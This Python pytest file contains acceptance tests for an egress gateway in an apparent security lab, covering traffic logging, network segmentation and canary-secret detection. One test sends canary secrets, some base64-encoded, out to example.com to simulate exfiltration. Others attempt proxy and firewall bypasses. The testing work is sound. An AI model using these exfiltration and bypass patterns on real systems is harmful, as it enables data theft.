"""Component D — egress gateway. Acceptance criteria from spec D.2, plus the firewall of 1.1.

Needs only the gateway container running (`docker compose up -d gateway`); throw-away probe
containers stand in for "a host on the target/defender/observer segment".
"""
import base64

import pytest

from conftest import (GATEWAY_CALL, docker, gateway_offset, network, observer_py, probe, registry,
                      running, wait_for_gateway_events, PROBE_IMAGE, PROJECT)

SPARE = {"target": "10.20.1.50", "defender": "10.20.2.50", "users": "10.20.3.60", "observer": "10.20.9.61"}
RUN_ID = "accept-gateway"


@pytest.fixture(scope="module", autouse=True)
def gateway_run():
    assert running("gateway"), "gateway is not running"
    canaries = [{"id": c.id, "marker": c.marker} for c in registry()]
    observer_py(GATEWAY_CALL + f'gw("PUT", "/run", {{"run_id": {RUN_ID!r}, "canaries": {canaries!r}}}); out(1)')
    yield
    observer_py(GATEWAY_CALL + 'gw("DELETE", "/run"); out(1)')


# ---------------------------------------------------------------- D.2: outbound traffic is logged

@pytest.mark.parametrize("segment", ["target", "defender"])
def test_outbound_requests_are_fully_logged(segment):
    start = gateway_offset()
    res = probe(segment, '''
s1, b1 = fetch("https://example.com/")
s2, b2 = fetch("http://example.com/lab-plain-http")
out({"https": s1, "http": s2})''', SPARE[segment])
    assert res["https"] == 200, res
    assert res["http"] in (200, 404), res

    def both_logged(events):
        seen = {(e["payload"].get("scheme"), e["payload"]["destination"]) for e in events
                if e["type"] == "egress_request" and e["payload"].get("src_role") == segment}
        return {("https", "example.com:443"), ("http", "example.com:80")} <= seen

    events = wait_for_gateway_events(start, both_logged)
    assert both_logged(events), events
    for ev in events:
        assert ev["source"] == "gateway" and ev["run_id"] == RUN_ID
        if ev["type"] == "egress_request" and ev["payload"]["action"] == "allowed":
            p = ev["payload"]
            assert p["size"] > 0 and p["duration_ms"] >= 0 and p["src_ip"] == SPARE[segment]   # destination, size, time
    seqs = [e["seq"] for e in events]
    assert seqs == sorted(seqs) and len(set(seqs)) == len(seqs), "seq must be monotonic per source"


# ---------------------------------------------------------------- D.2: canary exfiltration is detected

def test_canary_exfiltration_triggers_canary_egress():
    reg = registry()
    in_body, in_url, in_b64 = reg[0], reg[1], reg[2]
    blob = base64.b64encode(b"prefix-" + in_b64.marker.encode() + b"-suffix").decode()
    start = gateway_offset()
    res = probe("defender", f'''
s, _ = fetch("https://example.com/search?q={in_url.marker}", method="POST",
             data=b"notes: token={in_body.marker} blob={blob}")
out(s)''', SPARE["defender"])
    assert res is not None

    def detected(events):
        ids = {e["payload"]["canary_id"] for e in events if e["type"] == "canary_egress"}
        return {in_body.id, in_url.id, in_b64.id} <= ids

    events = wait_for_gateway_events(start, detected)
    assert detected(events), events
    hits = {(e["payload"]["canary_id"], e["payload"]["where"], e["payload"]["encoding"])
            for e in events if e["type"] == "canary_egress"}
    assert (in_body.id, "body", "plain") in hits
    assert (in_url.id, "url", "plain") in hits
    assert (in_b64.id, "body", "base64") in hits
    for ev in events:
        if ev["type"] == "canary_egress":
            assert ev["payload"]["destination"] == "example.com:443"
            assert ev["payload"]["src_role"] == "defender" and ev["payload"]["channel"] == "external"
    dump = repr(events)
    assert not any(c.marker in dump for c in reg), "the gateway log must carry canary ids, never the secrets"


def test_clean_traffic_raises_no_canary_alarm():
    start = gateway_offset()
    probe("target", 'out(fetch("https://example.com/?q=FAKECANARY-not-registered")[0])', SPARE["target"])
    events = wait_for_gateway_events(start, lambda evs: any(e["type"] == "egress_request" for e in evs))
    assert not [e for e in events if e["type"] == "canary_egress"]


# ---------------------------------------------------------------- D.2: no bypass

@pytest.mark.parametrize("segment", ["target", "defender"])
def test_internet_is_reachable_only_through_the_proxy(segment):
    start = gateway_offset()
    res = probe(segment, '''
out({"direct_tcp": tcp_open("1.1.1.1", 443), "direct_http": tcp_open("93.184.215.14", 80),
     "direct_fetch": fetch("https://1.1.1.1/", proxy=False, timeout=6)[0],
     "via_proxy": fetch("https://example.com/")[0]})''', SPARE[segment])
    assert res == {"direct_tcp": False, "direct_http": False, "direct_fetch": None, "via_proxy": 200}

    def drop_logged(events):
        return any(e["type"] == "egress_request" and e["payload"]["action"] == "blocked"
                   and e["payload"]["src_role"] == segment for e in events)

    events = wait_for_gateway_events(start, drop_logged, timeout=40)
    assert drop_logged(events), "the dropped direct attempt must itself appear in the egress log"


def test_proxy_is_not_a_stepping_stone_into_the_lab():
    """A/B may use the proxy for the Internet only — never to reach another segment through it."""
    res = probe("defender", f'''
out({{"observer_control": fetch("http://{network.ADDR['gateway_observer']}:8081/health", timeout=8)[0],
      "observer_host": fetch("http://{network.ADDR['observer']}:8000/", timeout=8)[0],
      "hypervisor": fetch("http://{network.ADDR['hypervisor']}:8080/status", timeout=8)[0],
      "loopback": fetch("http://127.0.0.1:8081/health", timeout=8)[0]}})''', SPARE["defender"])
    assert all(status != 200 for status in res.values()), res


# ---------------------------------------------------------------- 1.1: the observer segment is closed

@pytest.fixture()
def observer_side_listener():
    """Something listening inside the observer segment, to prove 'unreachable' is the firewall
    and not merely the absence of a listener."""
    name, ip = "agentopslab-accept-listener", "10.20.9.60"
    docker("rm", "-f", name)
    code = (f"import subprocess, http.server; subprocess.run(['ip','route','replace','default','via',"
            f"'{network.ADDR['gateway_observer']}']); "
            "http.server.HTTPServer(('0.0.0.0', 9999), http.server.SimpleHTTPRequestHandler).serve_forever()")
    started = docker("run", "-d", "--rm", "--name", name, "--network", f"{PROJECT}_observer_seg", "--ip", ip,
                     "--cap-add", "NET_ADMIN", "--entrypoint", "python", PROBE_IMAGE, "-c", code)
    assert started.returncode == 0, started.stderr
    yield ip
    docker("rm", "-f", name)


def test_target_and_defender_segments_cannot_reach_the_observer_segment(observer_side_listener):
    ip = observer_side_listener
    check = f'''
time.sleep(1)
out({{"listener": tcp_open("{ip}", 9999), "gateway_observer_leg": tcp_open("{network.ADDR['gateway_observer']}", 8081),
      "observer": tcp_open("{network.ADDR['observer']}", 22)}})'''
    # positive control: from inside the observer segment the listener is there
    assert probe("observer", f'time.sleep(1); out(tcp_open("{ip}", 9999))', SPARE["observer"]) is True
    start = gateway_offset()
    for segment in ("target", "defender"):
        assert probe(segment, check, SPARE[segment]) == {
            "listener": False, "gateway_observer_leg": False, "observer": False}, segment

    def both_counted(events):
        roles = {e["payload"]["src_role"] for e in events
                 if e["type"] == "egress_request" and e["payload"]["destination"] == "observer_segment"}
        return {"target", "defender"} <= roles

    events = wait_for_gateway_events(start, both_counted, timeout=40)
    assert both_counted(events), "attempts to reach the observer segment must be recorded"


@pytest.fixture()
def users_side_listener():
    """Something listening on the users segment (where the observer's client identities live)."""
    name, ip = "agentopslab-accept-users-listener", "10.20.3.61"
    docker("rm", "-f", name)
    code = (f"import subprocess, http.server; subprocess.run(['ip','route','replace','default','via',"
            f"'{network.ADDR['gateway_users']}']); "
            "http.server.HTTPServer(('0.0.0.0', 9999), http.server.SimpleHTTPRequestHandler).serve_forever()")
    started = docker("run", "-d", "--rm", "--name", name, "--network", f"{PROJECT}_users_seg", "--ip", ip,
                     "--cap-add", "NET_ADMIN", "--entrypoint", "python", PROBE_IMAGE, "-c", code)
    assert started.returncode == 0, started.stderr
    yield ip
    docker("rm", "-f", name)


def test_target_and_defender_cannot_open_connections_into_the_users_segment(users_side_listener):
    ip = users_side_listener
    check = f'''
time.sleep(1)
out({{"listener": tcp_open("{ip}", 9999), "observer_users_leg": tcp_open("{network.ADDR['users']}", 22),
      "probe_identity": tcp_open("{network.IDENTITY_IPS['probe']}", 9999)}})'''
    assert probe("users", f'time.sleep(1); out(tcp_open("{ip}", 9999))', SPARE["users"]) is True   # control
    start = gateway_offset()
    for segment in ("target", "defender"):
        assert probe(segment, check, SPARE[segment]) == {
            "listener": False, "observer_users_leg": False, "probe_identity": False}, segment

    def counted(events):
        roles = {e["payload"]["src_role"] for e in events
                 if e["type"] == "egress_request" and e["payload"]["destination"] == "users_segment"}
        return {"target", "defender"} <= roles

    assert counted(wait_for_gateway_events(start, counted, timeout=40)),         "attempts to reach the users segment must be recorded"


def test_users_segment_reaches_only_the_web_front_end():
    res = probe("users", f'''
out({{"https": tcp_open("{network.ADDR['target']}", 443), "http": tcp_open("{network.ADDR['target']}", 80),
      "ssh": tcp_open("{network.ADDR['target']}", 22, timeout=3),
      "hypervisor": tcp_open("{network.ADDR['hypervisor']}", 8080, timeout=3),
      "defender": tcp_open("{network.ADDR['defender']}", 8090, timeout=3),
      "langfuse": tcp_open("{network.ADDR['langfuse']}", 3000, timeout=3)}})''', SPARE["users"])
    assert res == {"https": True, "http": True, "ssh": False, "hypervisor": False, "defender": False,
                   "langfuse": False}


def test_control_api_needs_the_token():
    res = observer_py('''
req = urllib.request.Request(os.environ["GATEWAY_URL"] + "/events?offset=0")
try:
    urllib.request.urlopen(req, timeout=10); out(200)
except urllib.error.HTTPError as exc:
    out(exc.code)''')
    assert res == 401
